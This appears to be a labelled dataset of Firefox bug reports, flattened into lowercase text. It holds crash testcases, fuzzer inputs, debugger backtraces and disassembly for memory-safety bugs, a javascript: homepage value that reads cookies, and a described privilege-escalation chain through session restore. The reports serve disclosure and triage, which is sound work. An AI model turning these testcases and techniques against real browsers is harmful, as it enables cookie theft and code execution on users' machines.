fs 0 gs 55 i can reproduce on mac with a saved version reducing now	11
ati on mac webgl demo to the road of ribbon crashes in useprogram atiradeonx3000gldriver steps to reproduce at least on my computer 1 load 2 in the dropdown in the upper right select the 3d demo called to the road of ribbon 3 click the load button result bp-788d54b6-7ae3-47d1-a7f8-2197c2110620 security-sensitive because it s accessing what looks like a random memory address this is a new macbook pro with mac os x 10.6.7 graphics info from about support adapter description webgl renderer ati technologies inc ati radeon hd 6750m opengl engine 2.1 ati-1.6.34 gpu accelerated windows 1/1 opengl	11
proxy nsxpcwrappedjs release to the main thread running the release on a thread other than the main thread can crash because we add nsxpcwrappedjs objects to the cycle collector which assumes objects ca n't be refcounted while it runs both addref and release are problematic but release will lead to crashes for sure whereas addref can lead to premature unlinking which should n't cause crashes but might i ll add a patch here to fix the crashes due to release bug 684711 will deal with the whole issue	11
nsa c string setlength overflow in encodeinputstream l198 result of acount 2 3 4 aoffset may overflow based on the argument acount and aoffset the resulting buffer size result could be truncated and we ll write potentially attacker controlled content past the buffer reporting as unconfirmed since i m not sure there is somewhere an overflow check but does n't seems to be and also not sure this is easily exploitable i can try to create a test case	11
crash in angle s libglesv2 in glteximage2d on a cube map invalid read in gl texture createsurface ben hawkes reports that his testcase from bug 686398 still crashes firefox 10.0a1 on windows here is a crash report this is very different from bug 686398 is a angle bug need to report upstream and potentially a security concern invalid read at non-null address	11
arm assertion failure inst mask expected at methodjit/icchecker.h:56 the following test crashes on mozilla-central revision e79245e249c4 options m n a armv7-a arch only try this.watch b substring catch exc1 eval var uri test function test uri zcti application xxxx_demo uri pstn_data uri dnis 877-485-xxxx dnis uri pstn_data uri keyvalue key name value xxx uri keyvalue key phone value 6509309000 test the optimized build does not crash but stepping through the assertion causes a crash but the assert also differs here it might be that the testcase requires additional tweaking to reveal the issue on opt marking this as s-s due to the crash if the crash is debug-only feel free unhide backtrace of crash program received signal sigabrt aborted assertion failure insn assembler/assembler/armassembler.h:994 static jsc armword jsc armassembler getldrimmaddress jsc armword program received signal sigsegv segmentation fault in jsc armassembler getldrimmaddress insn at assembler/assembler/armassembler.h:994 994 assert insn gdb bt 0 in jsc armassembler getldrimmaddress insn at assembler/assembler/armassembler.h:994 1 in jsc armassembler patchpointerinternal from=1074373000 to at assembler/assembler/armassembler.h:1020 2 in jsc armassembler relinkcall from to at assembler/assembler/armassembler.h:1139 3 in jsc macroassemblerarm repatchcall call destination at assembler/assembler/macroassemblerarm.h:1523 4 in jsc repatchbuffer relink this call destination at assembler/assembler/repatchbuffer.h:95 5 in js mjit ic repatcher relink this call stub at methodjit/icrepatcher.h:90 6 in patchsetfallback f ic at home/decoder/langfuzz/mozilla-central/js/src/methodjit/monoic.cpp:150 7 in updatesetglobalname f ic obj shape at home/decoder/langfuzz/mozilla-central/js/src/methodjit/monoic.cpp:280 8 in js mjit ic setglobalname f ic at home/decoder/langfuzz/mozilla-central/js/src/methodjit/monoic.cpp:329 9 in jaegerstubveneer at home/decoder/langfuzz/mozilla-central/js/src/methodjit/methodjit.cpp:164 10 in can not access memory at address 11 in can not access memory at address backtrace stopped previous frame identical to this frame corrupt stack	11
failure to mark some shapes during delayed marking when we do delayed marking we call js_tracechildren on each marked object in the arena it calls markchildren when given a shape markchildren fails to set the marked bit for its parent shape it just walks up the shape tree i stumbled upon this while doing incremental gc but it suggests that we need to do better testing of delayed marking probably via bug 673551 in the patch i had to change the return type of previous so that the write barrier checks do n't complain	11
crash after mutating dom from mozbeforeresize event crash presshell resizereflowignoreoverride	11
assertion failure canallocunaligned n at js/src/ds/lifoalloc.cpp:100 or crash memcpy_ssse3_rep the following test asserts on mozilla-central revision f98c57415d8d options m n a 32 bit try var str 0123456789 for var icount 0 icount 24 let icount printstatus function gczeal 2 1 str str str catch ex new xml str false new regexp 0-9 3 test 23 2 34 78 9 09 this.tosource furthermore this test crashes on optimized 32 bit versions 0 memcpy_ssse3_rep at sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.s:1309 1 in js lifoalloc reallocunaligned this origptr origsize=167772162 incr=167772162 at usr/include/bits/string3.h:52 2 in sprintensurebuffer sp len value optimized out at srv/repos/mozilla-central/js/src/jsopcode.cpp:752 3 in js sprintput sp s len=1 at srv/repos/mozilla-central/js/src/jsopcode.cpp:784 4 in sprintcstring sp format c at srv/repos/mozilla-central/js/src/jsopcode.cpp:804 5 js sprint sp format c at srv/repos/mozilla-central/js/src/jsopcode.cpp:840 6 in quotestring sp str value optimized out quote=34 at srv/repos/mozilla-central/js/src/jsopcode.cpp:922 7 in js_quotestring cx str quote=34 at srv/repos/mozilla-central/js/src/jsopcode.cpp:940 8 in js_valuetosource cx v at srv/repos/mozilla-central/js/src/jsstr.cpp:3351 9 in obj_tosource cx argc=0 vp at srv/repos/mozilla-central/js/src/jsobj.cpp:669 10 in calljsnative cx args construct=js no_construct at jscntxtinlines.h:311 s-s and sg critical due to obvious memory hazard	11
jsval has different alignments in c and c jsdivalue.getwrappedvalue broken on 32-bit firebug is using jsdivalue.getwrappedvalue api to get list of of local closure scope variables names and values to get list of a scope properties firebug is using var listvalue value null lengthvalue value 0 jsdistackframe frame.scope.getproperties listvalue lengthvalue it works on windows but in ubuntu applying getwrappedvalue on returned properties prop.name and prop.value returns a number instead of a name or a value here is the related code in firebug svn 73 str 1 install firebug e.g from here c4 2 load 3 follow steps on the test page the watch side panel properly displays local variables a b c and their values in windows but in ubuntu i am seeing something like 4.428469523771077e-75 2.12199573e-314 etc looks like a reference/address instead of an actual value tested with firefox nightly built from honza	11
crash memcpy_ssse3_rep through jsrope flatten the following test crashes on mozilla-central revision c5b90ea7e475 options m n a 32 bit only var save__proto proto proto save__proto function bar x y return x y function foo x y var a 0 for var i 0 i 1000 i a this.tostring a bar x y a bar x a a bar x y return a var q foo 0 1 print q.tosource backtrace 0 memcpy_ssse3_rep at sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.s:1293 1 in js podcopy unsigned short dst src nelem=259260942 at jsutil.h:322 2 in jsrope flatteninternal jsrope usingbarrier 1 this maybecx at srv/repos/mozilla-central/js/src/vm/string.cpp:225 3 in jsrope flatten this maybecx at srv/repos/mozilla-central/js/src/vm/string.cpp:268 4 in jsstring ensurelinear this cx at srv/repos/mozilla-central/js/src/vm/string.h:822 5 in jsstring getchars this cx at srv/repos/mozilla-central/js/src/vm/string.h:804 6 in quotestring sp str quote=34 at srv/repos/mozilla-central/js/src/jsopcode.cpp:872 7 in js_quotestring cx str quote=34 at srv/repos/mozilla-central/js/src/jsopcode.cpp:940 8 in str_tosource cx argc=0 vp at srv/repos/mozilla-central/js/src/jsstr.cpp:536 9 in js calljsnative cx native str_tosource jscontext uintn js value args at jscntxtinlines.h:311 10 in js invokekernel cx args construct=js no_construct at srv/repos/mozilla-central/js/src/jsinterp.cpp:625 11 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:3506 12 in js mjit entermethodjit cx fp code stacklimit partial=false at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:1093 s-s and sg critical due to obvious memory hazard probably buffer overflow	11
assertion failure infer failure missing type pushed 0 at jsinfer.cpp:349 the following test asserts on mozilla-central revision d98fbf3cbd71 options m n var ubound 0 var actual var actualvalues var expect var expectedvalues function addthis actualvalues ubound actual expectedvalues ubound expect ubound function testlengthonnonnativeproto var o2 o2.__proto for var j 0 j 5 addthis o2.length asserteq testlengthonnonnativeproto no assertion s-s due to previous infer failures being security-relevant	11
browser-only methodjit crash triggered by css transform tests found by aryeh gregor see url i ca n't get it to happen in the shell doctype html script var p 0 function f y var a b c d for var k 0 k 2 k var z 0 p 0 0 y if a undefined z a a z if c undefined z c c z throw 0 var arr 1 1 1 1 1 1 1 0.5 for var i 0 i 5 i for var j 0 j 8 j try f arr j catch exc console.log fail script	11
crash txstylesheetcompiler flushcharacters opening the attached svg causes a crash with null ip the svg uses xsl transforms i m reporting this as a potential security issue even though the crash is a null because some common ways to get a null ip e.g stack buffer overflow are more likely exploitable than run-of-the-mill null reads crash traces from 64-bit debian 6.0.3 8.0 9.0 beta	11
crash with eip when parsing svg+xslt when opening a specific svg file created by a mutation fuzzer the browser will crash with eip this was tested on firefox 3.6.24 ubuntu 10.04 lts and firefox 8.0 winxp sp3 under linux a call to eax at zn20txstylesheetcompiler15flushcharactersev+26 will set eip to an annotated gdb session is attached a similar behavior is constated on firefox 8.0 a screenshot of windbg exploitable is attached too	11
prevent self-xss in homepage icon disallow javascript drops user agent mozilla/5.0 windows nt 6.1 rv:9.0.1 gecko/20100101 firefox/9.0.1 build id 20111220165912 steps to reproduce tested on firefox 9.01 windows 7 sp1 reproduce 1 change you homepage to javascript alert document.cookie or also you can be javascript www.google.com.br xss 0aalert 1 2 go to 3 click in homepage icon 4 see yours cookies of i think this can be exploited to steal cookies because extensions can change the homepage and convence the victim to click in homepage	11
loads of principal-inheriting uris e.g javascript on chrome-privileged pages e.g about sessionstore allows unexpected privilege escalation it is possible to trap user on a chrome privileged page with buttons leading to arbitrary code if a browser session is launched with a maliciously crafted homepage uri there are 2 things which combined may effectively prevent users from realizing they deal with a malicious link when they set their homepage by dropping an image on the home button 1 using datatransfer text/x-moz-url of the drag can be manipulated on the fly 2 firefox displays a misleading prompt after dropping a link on the home button it says that this document is being set as the homepage which is incorrect thus the user has no way of knowing what uri will be set as homepage without inspecting the source unless they realize that both the status bar of the dragged image and the prompt message from the browser are misleading and go check the newly set home page in options general instead of simply pressing the home button to see if it goes where expected it can be leveraged by a malicious party in 2 ways 1 stealing cookies the obvious and not very interesting scenario javascript image src will silently steal cookies of every website the user navigates away from by pressing the home button 2 code execution here s a video demonstrating the concept select fullscreen and 1080p for the optimal quality the malicious website detects the draginit event of the icon and verifies that the desired uri landed on the homepage by probing an iframed javascript window.home then it sets the cookie to schedule a crash in the next browsing session when a new session is started the website starts crashing the browser after 2 crashes the user is presented with about sessionrestore and 2 options if they decide to restore the session firefox will crash again and the user will return to about sessionrestore trying to remove the home page tab from the list will disable the restore button if they click the other button start a new session the javascript link will inherit chrome privileges from about sessionrestore and an arbitrary code will be executed pressing the home button will execute the payload as well seeing that this method of setting home page is fairly popular several well known websites provide their drag icons and it is a seemingly innocuous action you may want to disallow setting uri_inherits_security_context as a homepage unless you see a demand for using bookmarklets as homepages it would be the easiest way to make this feature safe displaying the actual uri in the confirmation prompt would make it less prone to abuse too	11
disallow inheriting of system principal in type=content docshells we ve had a number of bugs over the years that were the result of somehow managing to load principal-inheriting uris data and javascript on chrome-privileged pages loaded in the browser content area e.g about config now that we have more and more chrome-privileged in-content pages that s even more likely to be possible as a precautionary measure it makes sense to disallow these loads from inheriting the system principal it seems quite unlikely that there are any valid use cases for this	11
access to a keyframe s csstext after dynamic modification always crashes gecko the following test modifies a keyframe through js and then reads its csstext twice gecko will always crash sometimes at first read sometimes at second verified on os x and linux 32bits with 12.0a1 related crash reports bp-7624db3c-492f-42f1-9364-e2f132120202 bp-8eaecc4f-b4f1-4b5c-870c-b235b2120202 bp-9c64754f-0056-48eb-936f-0f4a62120202 bp-4237d936-28e5-4f62-8a00-f5d9c2120202 bp-9c32ddbf-211f-4d7d-9897-448002120202 this bug blocks the css animations editor i am currently working on for bluegriffon	2
window.fullscreen can be set by untrusted content but does not check for permission or show escape ui before the mozrequestfullscreen api was enabled window.fullscreen was read-only for untrusted content now that the dom fullscreen api is enabled window.fullscreen is writeable by untrusted content this is a side-effect of this patch from bug 545812 l8.12 this is dangerous because window.fullscreen does not include mozrequestfullscreen s security mechanisms e.g ishandlinguserinput check popup notification escape keys it could be used in a ui spoofing attack i think this change was unintentional and the correct solution is to keep window.fullscreen read-only for untrusted content content can use the new dom fullscreen api instead	2
adbe 2875277 crash std construct messageloop pendingtask messageloop pendingtask messageloop pendingtask messageloop pendingtask const abort crt assert dbgheap.c 1279 assertion failed crtisvalidheappointer puserdata tested with 10.3.181.14 crash 1 1 2 crash plugin-container.exe with corrupt heap during local testing crash 2 1 2 sometimes crash with corrupt heap this may be a loaded advertisement that is periodic this may be related to bug 651575 i believe i did see an ad from ad.xtendmedia.com when testing this crash automation found operating system windows nt 5.1.2600 service pack 3 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason exception_access_violation_write crash address assertion unknown assertion type thread 0 crashed 0 xul.dll std construct messageloop pendingtask messageloop pendingtask messageloop pendingtask messageloop pendingtask const xmemory 53 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll std allocator messageloop pendingtask construct messageloop pendingtask messageloop pendingtask const xmemory 156 eip esp ebp found by call frame info 2 xul.dll std deque messageloop pendingtask std allocator messageloop pendingtask push_back messageloop pendingtask const deque 826 eip esp ebp found by call frame info 3 xul.dll std queue messageloop pendingtask std deque messageloop pendingtask std allocator messageloop pendingtask push messageloop pendingtask eip esp ebp found by call frame info 4 xul.dll messageloop posttask_helper tracked_objects location const task int bool message_loop.cc 293 eip esp ebp found by call frame info 5 xul.dll messageloop posttask tracked_objects location const task message_loop.cc 251 eip esp ebp found by call frame info 6 xul.dll mozilla ipc rpcchannel enqueuependingmessages rpcchannel.cpp 366 eip esp ebp found by call frame info original socorro report bp-f3ef37b3-08e9-4a9a-a7e7-19e0b2110513 crash report usercallwinproccheckwow	11
crash nsmediacachestream read char unsigned int unsigned int 1 at=15 2 crash beta/11 aurora/12 nightly/13 mac linux windows after you crash once it may be difficult to reproduce on the same system not sure why ted s exploitable tool rates this as hightly exploitable i could n't reproduce with a locally saved version bp-ec8057be-9224-4b25-85fa-8f9b02120224 bp-39b7c534-980f-4d60-bb49-e98a62120224	11
angle assertion typename failed parser crash ttype ttype this bug was filed from the socorro interface and is report bp-611f2a52-3fc5-4d96-8f62-67a322111102 the attached webgl testcase asserts in firefox nightly debug tested with mesa llvmpipe software rendering firefox builds/slave/m-cen-lnx64-dbg/build/gfx/angle/src/compiler/types.h:209 const tstring ttype gettypename const assertion typename failed running in a release build the test crashes at ttype ttype see crash report the test might require moz_gl_debug=1 this is another parser crash but not a null-deref according to the crash report marking this s-s until triaged and rated let me know if i shall report this to angle or if you do so	11
webgl canvas displaying uninitialized video memory setting the canvas width and height properties after you get an webgl context can lead to reading of arbitrary video data desktop images other tabs etc this seems to occur on macbook airs and not on macbook pros this occurs in firefox 6.0.2 as well as nightly machine model name macbook air model identifier macbookair4,2 processor name intel core i7 processor speed 1.8 ghz number of processors 1 total number of cores 2 l2 cache per core 256 kb l3 cache 4 mb memory 4 gb boot rom version mba41.0077.b0e smc version system 1.73f63 about support adapter description webgl renderer intel inc intel hd graphics 3000 opengl engine 2.1 apple-7.12.9gpu accelerated windows 1/1 opengl	11
nslots_limit is too high for jit d code while reviewing bug 701093 i noticed that the nslots_limit of 2^29 is probably too high in jm and im we emit code like mov dest slots index 8 the index 8 is signed so to not overflow the index must be 2^28 with m n js q js i 0 0 js while true q i i i typein:4 out of memory js q.length 498991104 js function f var a for var i 0 i 10000 i a q 498991103 return a js f program received signal exc_bad_access could not access memory reason kern_invalid_address at address in	11
hang forever in bilibili.tv since 20111220 nightly str open stay a minute hang firefox.exe process take more and more memory win 7 sp1 32bit 2011-12-19 nightly was fine it s any difference in 12a1 11a1 of 20121220 nightly	11
assertion no self with treewalker filter modified proto assertion no self self file e builds/moz2_slave/m-cen-w32-dbg/build/xpcom/reflect/xptcall/src/md/win32/xptcstubs.cpp line 68	11
crash getcollectionfortype with proto description this crash seems to be related to the use of proto the worker object and event calls on the object it s marked as a security issue as it crashes on accessing non-mapped memory addresses which vary and could potentially be controlled by an attacker tested and affected versions firefox 9.0.1 windows firefox trunk 12.0a linux ubuntu firefox 9.0.1 testcase the following testcase trigger the bug and shows exploitable behaviour on linux null deref on windows o2=new arraybuffer 1337 o4=new worker null o2.__proto o4.__proto o2.addeventlistener 0,0 this testcase shows potentially exploitable behaviour on both windows and linux o2=document.body o4=new worker null o2.__proto o4.__proto o2.removeeventlistener 0,0 stack backtrace following stack backtraces have been observed during testing linux gdb bt 10 0 getcollectionfortype atypeid=140736937735104 ahead at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/dom/workers/listenermanager.cpp:132 1 mozilla dom workers events listenermanager add this acx atype alistenerval aphase=mozilla dom workers events listenermanager bubbling awantsuntrusted=false at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/dom/workers/listenermanager.cpp:204 2 in addeventlistener awantsuntrusted optimized out acapturing optimized out alistener optimized out atype optimized out acx this at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/dom/workers/listenermanager.h:98 3 mozilla dom workers events eventtarget addeventlistener acx aargc=3 avp at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/dom/workers/eventtarget.cpp:162 4 in calljsnative args native optimized out cx at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jscntxtinlines.h:296 5 js invokekernel cx argsref optimized out construct=js no_construct at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jsinterp.cpp:660 6 in js interpret cx entryframe interpmode=js jsinterp_normal at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jsinterp.cpp:4036 7 in js executekernel cx script scopechain optimized out thisv optimized out type optimized out evalinframe optimized out result at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jsinterp.cpp:814 8 in evalkernel cx call evaltype=direct_eval caller scopeobj at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jsobj.cpp:1283 9 in js interpret cx entryframe interpmode=js jsinterp_normal at build/buildd/firefox-9.0.1+build1/build-tree/mozilla/js/src/jsinterp.cpp:4005 more stack frames follow windows xul anonymous namespace getcollectionfortype xul mozilla dom workers events listenermanager remove xul mozilla dom workers events listenermanager removeeventlistener xul mozilla dom workers events eventtarget removeeventlistener mozjs js invokekernel mozjs js interpret mozjs js runscript mozjs js executekernel mozjs evalkernel mozjs js directeval mozjs js interpret mozjs js runscript mozjs js executekernel mozjs js execute mozjs evaluateucscriptforprincipalscommon mozjs js_evaluateucscriptforprincipalsversion xul nsjscontext evaluatestring xul nsjsthunk evaluatescript xul nsjschannel evaluatescript xul nsrunnablemethodimpl void thiscall mozilla dom indexeddb lazyidlethread void 0 run it crashed on following instruction xul anonymous namespace getcollectionfortype 70e532b0 8b4c2404 mov ecx dword ptr esp+4 70e532b4 8b01 mov eax dword ptr ecx 70e532b6 eb0b jmp xul anonymous namespace getcollectionfortype 70e532c3 70e532b8 8b5008 mov edx dword ptr eax+8 ds:002b:24748b5e 70e532bb 3b542408 cmp edx dword ptr esp+8 70e532bf 7408 je xul anonymous namespace getcollectionfortype 70e532c9 70e532c1 8b00 mov eax dword ptr eax 70e532c3 3bc1 cmp eax ecx 70e532c5 75f1 jne xul anonymous namespace getcollectionfortype 70e532b8 70e532c7 33c0 xor eax eax 70e532c9 c3 ret reported by nils of vulndev ltd	11
crash xul nsoverflowcontinuationtracker setuplistwalker description this crash seems to be a problem during the layout of the page it affects the current trunk version and does not crash in firefox 9.0.1 the following assertions are hit before a crash on a debug build assertion this type of frame ca n't have overflow containers aproperty nscontainerframe overflowcontainersproperty aproperty nscontainerframe excessoverflowcontainersproperty isframeoftype nsiframe ecancontainoverflowcontainers file layout/generic/nscontainerframe.cpp line 1455 assertion stealframe ca n't find achild removed file layout/generic/nscontainerframe.cpp line 1245 assertion stealframe failure ns_succeeded rv file layout/generic/nscontainerframe.cpp line 1374 affected versions firefox 12.0a trunk testcase a testcase is attached stack backtrace on windows xul nsoverflowcontinuationtracker setuplistwalker xul nsabsolutecontainingblock reflow xul nsframe reflowabsoluteframes xul nsiframe getoverflowareasproperty xul nsblockreflowcontext reflowblock xul nsblockframe reflowblockframe xul nsblockframe reflowline xul nsblockframe reflowdirtylines xul nsblockframe reflow xul nsblockreflowcontext reflowblock xul nsblockframe reflowblockframe xul nsblockframe reflowline xul nsblockframe reflowdirtylines xul nsblockframe reflow xul nscontainerframe reflowchild xul nscolumnsetframe reflowchildren xul nscolumnsetframe reflow xul nsblockreflowcontext reflowblock xul nsblockframe reflowblockframe xul nsblockframe reflowline it crashes on following instruction xul nsoverflowcontinuationtracker setuplistwalker 71166a00 ff90b8000000 call dword ptr eax+0b8h ds:002b f0de80b7 reported by nils of vulndev ltd	11
assertion failure lastproperty hasslot getslot lastproperty slot isundefined at jsscope.cpp:1056 the following test asserts on mozilla-central revision 42368fe44c8c options m n function myobject value this.toboolean this this.function this new myobject true	11
assertion failure dictp indictionary when proxy fix returns a large array var a for var i 0 i 200 i a.push var p proxy.create fix function return a object.preventextensions p assertion failure dictp indictionary at js/src/jsscopeinlines.h:359 the first bad revision is changeset ff51ddfdf5d1 user brian hackett date wed sep 28 15:04:55 2011 0700 summary remove shape numbers and shape slotspan factor shape getter/setter into baseshape bug 684505	11
nswindow for android does n't check whether the instance is destroying or not after dispatching an event android s nswindow does n't hold itself and does n't check whether it s destroying or not after dispatching an event i m not sure that actually causes crash bugs we should research it nswindow might be destroyed by dom event handler mac s widget has fixed this already but i m not sure the detail and bug steven probably knows the bug i think nswindow for android should do nsrefptr nswindow kungfudeathgrip this dispatchevent event if destroyed return and nswindow should set nsbasewidget mondestroycalled to true when it s destroying it seems that nsbasewidget ondestroy should be called too	9
do n't run compileandgo scripts on globals with a cleared scope clearing a global s scope wrecks a whole host of assumptions which the jits and ti make about scripts compiled against that global there are some guards against this when executing scripts but these are not enough and compileandgo scripts can and do still run against the global after clearing it this is causing bug 679247 intermittent ti tinderbox failure i added some instrumentation and found that a particular script is getting analyzed by inference has its global cleared and later on starts/resumes execution in the interpreter when the script executes a jsop_lambda it pushes a function with a different reconstructed function.prototype which ti assertions catch from cursory examination of the code it looks like we only check for a cleared global in runscript and not when making inline calls from the interpreter it seems like interpreter inline calls could cross from an uncleared global to a cleared global with no iscleared check occurring i do n't know if fixing this would be enough however under what constraints are scopes cleared can scripts associated with the global have frames on the stack can such scripts still have mjit code if the latter holds this would be a problem for the full call stubs which the mjit generates which allow mjit frames to call arbitrary scripts which have jitcode without a cleared global check the real fix here is to remove scope clearing entirely bug 637099	11
java related crash with deleted pointer in esx 0 enable java tm platform se 6 u29 1 enable popups 2 disable malware detector 3 4 shutdown will be loaded which is reported as a malware attack site nightly/11 windows 7 bp-f1059123-a28f-499c-9003-5ed772111129 crash report mozalloc_abort char const const ns_debugbreak_p mozilla plugins pluginmodulechild shouldcontinuefromreplytimeout see also bug 681385 automation hit this with ecx pointing to deleted memory i was n't able to reproduce locally though operating system windows nt 6.1.7601 service pack 1 cpu x86 genuineintel family 6 model 44 stepping 2 2 cpus crash reason exception_access_violation_write crash address thread 0 crashed 0 xul.dll nsnpapiplugininstance invalidateowner nsnpapiplugininstance.cpp 1431 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll nsdummyjavapluginowner destroy nsglobalwindow.cpp 483 eip esp ebp found by call frame info 2 xul.dll nsglobalwindow freeinnerobjects int nsglobalwindow.cpp 1311 eip esp ebp found by call frame info 3 xul.dll nsglobalwindow setdocshell nsidocshell nsglobalwindow.cpp 2397 eip esp ebp found by call frame info 4 xul.dll nsdocshell destroy nsdocshell.cpp 4611 eip esp ebp found by call frame info 5 xul.dll nsframeloader finalize nsframeloader.cpp 573 eip esp ebp found by call frame info	11
assertion fault in cycle collector traversed refs exceed refcount closing window nearscriptstacklimit 1 load the testcase 2 click the button 3 close the testcase 4 force a cc e.g by quitting firefox or using about memory result assertion fault in cycle collector traversed refs exceed refcount ptr 127319dc0 not reached file users/jruderman/trees/mozilla-central/xpcom/base/nscyclecollector.cpp line 1235 in addition everything leaks i can reproduce with both tinderbox debug builds and a local debug build mac os x 10.6 64-bit firefox some variants crash instead in exploitable-looking ways	11
assertion failure self nativecontains cx aprop at jsscope.cpp:1000 the following test asserts on mozilla-central revision d98fbf3cbd71 options m a n function testforvarinwith foo foo return eval with for var x 0 x 5 x function return delete x f testforvarinwith	11
potential buffer overflow in nsscriptableinputstream read with 4gb data ns_imethodimp nsscriptableinputstream read pruint32 acount char retval nsresult rv ns_ok pruint32 count 0 char buffer nsnull if minputstream return ns_error_not_initialized rv minputstream available count if ns_failed rv return rv count ns_min count acount buffer char nsmemory alloc count+1 make room for 0 if buffer return ns_error_out_of_memory have minputstream having exactly 4gb of data its available will return pr_uint32_max try to read all this 4gb of data with the scriptable stream count+1 will evaluate as 0 it is not well defined what result of malloc if nsmemory alloc resolve to it is with 0 as an arg so we may potentially get an invalid pointer and write to it	11
assertion failure compartment mismatched with nodelist custom length setter no description provided	11
heap overrun read write in nsbmpencoder converthostargbrow x86_64-linux running on a 16 bit deep vnc server test_path=content/canvas/test/test_todataurl_alpha.html display=:1 test_path=content/canvas/test/test_todataurl_alpha.html make c ff-opt mochitest-plain extra_test_args close-when-done debugger=vtrunk debugger-args tool=memcheck suppressions=/home/sewardj/moz/fglrx-supp.supp suppressions=/home/sewardj/moz/moz-supp.supp error-limit=no stats=yes smc-check=all-non-file trace-children=yes child-silent-after-fork=yes trace-children-skip=/usr/bin/hg bin/rm bin/certutil bin/pk12util bin/ssltunnel track-origins=no 2 1 tee spew2-memcheck-1 produces the errors below looks like a read-modify-write of an invalid address invalid read of size 1 at nsbmpencoder converthostargbrow unsigned char const unsigned char unsigned int nsbmpencoder.cpp:450 by nsbmpencoder addimageframe unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:228 by nsbmpencoder initfromdata unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:107 by nscanvasrenderingcontext2d getinputstream char const unsigned short const nsiinputstream nscanvasrenderingcontext2d.cpp:1345 by nshtmlcanvaselement extractdata nsastring_internal const nsastring_internal const nsiinputstream bool nshtmlcanvaselement.cpp:247 by nshtmlcanvaselement todataurlimpl nsastring_internal const nsivariant nsastring_internal nshtmlcanvaselement.cpp:340 by nsidomhtmlcanvaselement_todataurl jscontext unsigned int js value dom_quickstubs.cpp:17910 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2801 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:537 by js_fun_apply jscontext unsigned int js value jsinterp.h:157 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 address is 0 bytes after a block of size 300 alloc d at malloc vg_replace_malloc.c:263 by nsbmpencoder addimageframe unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const mozalloc.h:309 by nsbmpencoder initfromdata unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:107 by nscanvasrenderingcontext2d getinputstream char const unsigned short const nsiinputstream nscanvasrenderingcontext2d.cpp:1345 by nshtmlcanvaselement extractdata nsastring_internal const nsastring_internal const nsiinputstream bool nshtmlcanvaselement.cpp:247 by nshtmlcanvaselement todataurlimpl nsastring_internal const nsivariant nsastring_internal nshtmlcanvaselement.cpp:340 by nsidomhtmlcanvaselement_todataurl jscontext unsigned int js value dom_quickstubs.cpp:17910 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2801 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:537 by js_fun_apply jscontext unsigned int js value jsinterp.h:157 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 invalid write of size 1 at nsbmpencoder converthostargbrow unsigned char const unsigned char unsigned int nsbmpencoder.cpp:450 by nsbmpencoder addimageframe unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:228 by nsbmpencoder initfromdata unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:107 by nscanvasrenderingcontext2d getinputstream char const unsigned short const nsiinputstream nscanvasrenderingcontext2d.cpp:1345 by nshtmlcanvaselement extractdata nsastring_internal const nsastring_internal const nsiinputstream bool nshtmlcanvaselement.cpp:247 by nshtmlcanvaselement todataurlimpl nsastring_internal const nsivariant nsastring_internal nshtmlcanvaselement.cpp:340 by nsidomhtmlcanvaselement_todataurl jscontext unsigned int js value dom_quickstubs.cpp:17910 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2801 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:537 by js_fun_apply jscontext unsigned int js value jsinterp.h:157 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 address is 0 bytes after a block of size 300 alloc d at malloc vg_replace_malloc.c:263 by nsbmpencoder addimageframe unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const mozalloc.h:309 by nsbmpencoder initfromdata unsigned char const unsigned int unsigned int unsigned int unsigned int unsigned int nsastring_internal const nsbmpencoder.cpp:107 by nscanvasrenderingcontext2d getinputstream char const unsigned short const nsiinputstream nscanvasrenderingcontext2d.cpp:1345 by nshtmlcanvaselement extractdata nsastring_internal const nsastring_internal const nsiinputstream bool nshtmlcanvaselement.cpp:247 by nshtmlcanvaselement todataurlimpl nsastring_internal const nsivariant nsastring_internal nshtmlcanvaselement.cpp:340 by nsidomhtmlcanvaselement_todataurl jscontext unsigned int js value dom_quickstubs.cpp:17910 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2801 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:537 by js_fun_apply jscontext unsigned int js value jsinterp.h:157 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:311	11
